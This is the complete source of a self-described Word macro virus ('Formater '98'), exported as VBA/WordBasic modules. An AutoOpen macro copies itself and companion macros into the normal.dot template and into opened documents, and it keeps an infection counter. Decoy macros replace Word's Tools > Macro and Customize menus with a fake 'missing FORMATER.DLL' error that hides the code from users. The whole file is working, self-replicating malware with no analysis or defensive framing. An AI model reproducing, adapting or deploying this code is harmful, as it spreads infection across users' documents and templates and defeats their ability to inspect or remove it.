   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsCustomize"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "FORMATER\r\nThe Word Macro Virus By Formater"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsCustomize.MAIN"
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   WordBasic.MsgBox "Cannot find FORMATER.DLL. Windows needs this file to run" + Chr(13) + "winword.exe", "Formater", 48

   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "FORMATER\r\nThe Word Macro Virus By Formater"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   WordBasic.MsgBox "Cannot find FORMATER.DLL. Windows needs this file to run" + Chr(13) + "winword.exe", "Formater", 48
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "FORMATER\r\nThe Word Macro Virus By Formater"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim template$
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   template$ = WordBasic.[GetDocumentProperty$](WordBasic.[DocumentPropertyName$](9))
   If UCase(template$) = UCase("normal.dot") Then
       WordBasic.FileSaveAs Name:=WordBasic.[WindowName$](), Format:=1
       WordBasic.MacroCopy "AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
       WordBasic.MacroCopy "Counter", WordBasic.[WindowName$]() + ":Counter"
       WordBasic.MacroCopy "ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro"
       WordBasic.MacroCopy "ToolsCustomize", WordBasic.[WindowName$]() + ":ToolsCustomize"
       WordBasic.ToolsMacro Name:="Counter", Description:=Str(WordBasic.Val(WordBasic.[MacroDesc$]("Counter")) + 1), SetDesc:=1
       WordBasic.FileSave
   Else
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "AutoOpen"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Counter", "Counter"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsMacro", "ToolsMacro"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsCustomize", "ToolsCustomize"
       WordBasic.ToolsMacro Name:="Counter", Description:=Str(WordBasic.Val(WordBasic.[MacroDesc$]("Counter")) + 1), SetDesc:=1
   End If
   End Sub

   Attribute VB_Name = "Counter"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = " 58"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Counter.MAIN"
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98
   End Sub
